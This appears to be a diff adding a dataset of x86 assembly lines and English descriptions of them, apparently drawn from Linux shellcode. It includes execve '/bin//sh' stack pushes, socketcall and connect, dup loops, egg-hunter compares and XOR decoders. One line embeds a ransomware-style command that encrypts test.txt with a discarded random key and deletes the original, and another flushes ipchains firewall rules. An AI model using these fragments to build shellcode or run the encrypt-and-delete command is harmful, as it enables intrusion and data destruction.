@@ -1,0 +1,200 @@
+letter_c db 'c'
+"mov eax, 19"
+push 0xb to the stack
+push 0x4c5a304b onto the stack
+pause
+"xor eax, eax \n cmp edx, eax \n je l3"
+push 0xb
+"push 0x6e7a762d \n mov ebx, esp"
+"lea edi, [esi+13]"
+declare the exit label
+"push long 0x68732f2f \n push long 0x6e69622f \n mov ecx, esp"
+"msg db 'mv test.txt .test.txt && head -c 32 /dev/urandom | base64 | openssl aes-256-cbc -e -in .test.txt -out test.txt -pbkdf2 -k - && rm .test.txt', 0x0a"
+enc:
+move 37 into al
+"cmp dword [eax-4],egg1"
+dec byte dl
+move ecx into ebp
+jump to the init label if the contents of the cl register is equal to the contents of the dl register else increment the contents of the cl register
+"cmp edx, ebx \n je 0x8 \n mov ebx, edx"
+"mov byte al, 0x3f"
+jump to the l3 label if the contents of the ax register is not equal to the contents of the bx register else jump to the while label
+"cmp ax, bx \n jne l3 \n jmp while"
+restore ebp register
+increment the count variable
+restore the top of the stack into the ecx register then decrement the ecx register and jump to the l3 label if the contents of the ecx register is not zero else make the system call exit
+jump to the label _while_loop if the contents of the eax register is negative
+"add byte [var], 10"
+clear the ebx register and push its contents onto the stack
+"cmp eax, 0"
+"xor ebx, ebx \n push ebx"
+"mov al, byte 2h"
+if the contents of the eax register is not equal to the contents of the edi register then jump to the infinite label
+put the syscall 11 into the al register
+"mov cx, 0x3b30"
+"mov ax, table[esi*4]"
+"cmp bl, al \n je loop_2"
+"mov dword [esp-4], esi"
+compare the contents of the al register and the contents of the cl register
+move close_syscall into al
+dec byte dl
+"push 0x68732f2f \n push 0x6e69622f \n mov eax, esp"
+perform a logical xor between the bx register and the ax register and save the result in ax
+ret
+"xor ecx, ecx"
+push 0x78
+if the contents of the eax register is not zero then jump to the label _convert
+cld
+move the remainder into edi
+push ax onto the stack
+reset ebx to 0
+use stdout
+jump to the label _read if the zero flag is set
+jump to the label _close if the zero flag is set
+jump to the label _parent if the contents of the eax register is not zero else restore the top of the stack into the ecx register
+"mov dl, byte [eax]"
+push 0x72706475
+inc [count]
+"cmp dl, cl \n jb l1 \n mov al, 0x39"
+"mov ebx, esp"
+div ecx
+move write_syscall into al
+clear the edi register
+"sub eax, 5d455523"
+move the contents of cl into the byte at memory address esi+eax
+"mov al, 0x5"
+"lea edx, [ebx+12]"
+perform a logical xor between the address speicified by [ecx + 116] and the dh register and save the result in [ecx + 116]
+if the contents of the al register is zero then jump to the label found else increment the contents of the ecx register
+inc ecx
+"db '0',10"
+define my_var word variable and initialize it to 0abcdh
+"mov ebx, 1"
+"mov ebx, m_src1"
+put /bin/sh into edx
+"mov bl, 0x1"
+move b to eax
+push 0x31373737 onto the stack
+compare eax to zero
+make the kernel call
+call the iprint function
+push dword 0x62732f2f
+initialize ecx with decimal value 0
+"mov byte [esp+3], 0x01"
+move 0x3f into the byte at address al
+jump to the child label if the zero flag is set
+push 0x78
+pop bx
+"test eax, eax \n jnz _convert"
+jump if greater than to label finished
+"mov [esi+eax], cl"
+pop eax
+subtract 0x24 from the contents in esp and save the result in esp
+"mov eax, 29"
+cycle:
+"xor edi, edi"
+push 0x2f2f2f6e
+push the double word 0x2f6e6962 onto the stack
+"add al, 0x33"
+left shift the contents of the edx register by 9 bits
+push word 0xaaaa
+move ecx into ebx
+pop the last element pushed onto the stack into bx
+"push 0x2f2f2f2f \n mov edi, esp"
+"mov edx, 11"
+move integer 11 to edx
+move m_src1 to ebx
+perform a logical xor between the ecx register and the bh register and save the result in ecx
+move the 4 bytes of data at address esi+4*ebx into edx
+dec ecx \n jns loop2
+push the dword 0x62732f2f onto the stack
+move 0xc into dl
+push the byte 6 onto the stack
+if the contents of the eax register is not zero then jump to the label _parent else restore the top of the stack into the ecx register
+"push 10 \n mov eax, esp"
+push 0x6e69622f
+push the dword 0x3a303a3a onto the stack
+if the contents of the edx register is equal to the contents of the ebx register then jump to the memory address 0x8 else move the contents of the edx register into the ebx register
+move 4294948047 into ecx
+push 0x76766c2d
+"mov al, 0x66"
+add 10 to the single byte stored at memory address var
+decrement the count register and jump to decode if not equal zero
+push the esp onto the stack
+call iprintlf
+left shift the contents of eax by 5 bit positions
+move the stack pointer into edx
+push the 0x2f2f2f6e onto the stack
+jz finished
+move 0x01 into the byte at address [esp+3]
+pop the value on the stack back into cx
+move the contents of the esi register into the dword at the memory location [esp-4]
+if the contents of the eax register is zero then jump to the label check_html
+db '/sbin/ipchains#-f#'
+clear edx
+push the dword 0x2f3a3a30 onto the stack
+"mov [esi+22], al"
+decrement the contents of the ecx register and jump to the duploop label if the result is not negative
+push the 0x69616863 onto the stack
+"sub bx, 1663"
+push 0x69616863
+declare the do_dup label
+pop esi
+"mov [var1], eax"
+point ebx to stack
+push 0x78534a52 onto the stack
+push 0x53534150 onto the stack
+"mov al, 11"
+system call socketcall
+fork
+"mov byte cl, 7"
+"define port array of 5 bytes and initialize it to 0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77"
+"mov eax, 65"
+push the contents of the edi register onto the stack and point edx to the stack register
+"xor ebp, ebp"
+make the system call to open the file
+"mov ecx, y"
+clear the ecx register and push its contents onto the stack
+push the word 0x6f64 to the stack
+data:
+"cmp bl, 78h \n jl short loc_402B1D"
+"mov eax, 0x33392e31"
+load the effective address of esi+13 into esi+13
+"push 0x6374652f \n mov esi, esp"
+jump short to the enc label
+push 0x68736162 onto the stack
+system call interrupt
+"cmp cl, 12 \n jg l2"
+get process group
+"mov bl, 0x9"
+"pop ecx \n loop l3 \n mov eax, 1"
+push word 0644o
+clear the edx register
+"mov ecx, 4294948047"
+"xor al, 0x41"
+push byte 16 \n pop eax
+if the contents of the dl register is equal to the vale 1 then jump to the exit label else jump to the reading label
+move 0x0 into ecx
+compare ebx register's lower half value against ascii value 57
+move 0x34399797 into esi
+push the 0x37373333 onto the stack
+"shl eax, 5"
+zero out the ebx register and jump to the exit label if the contents of the eax register is equal to the contents of the ebx register
+"lea esi, [esi +4]"
+"mov eax, 27"
+jump to the memory address 0x8 if the contents of the eax register is not equal to the contents of the eax register else zero out the eax register
+make the system call
+push the dword 0x6b2f7379 onto the stack
+subtract 5d455523 from the contents of the eax register
+make the system call sigaction
+push the contents in ogin onto the stack
+add the contents of the edi register to the contents of edi register
+push ax
+invoke subroutine connect
+do_dup:
+"xor ebx, ebx"
+move 102 into ax
+swap the contents of the eax register with the contents of the esi register
+jz child
+move 7 into the byte at address cl
+jump to the label read
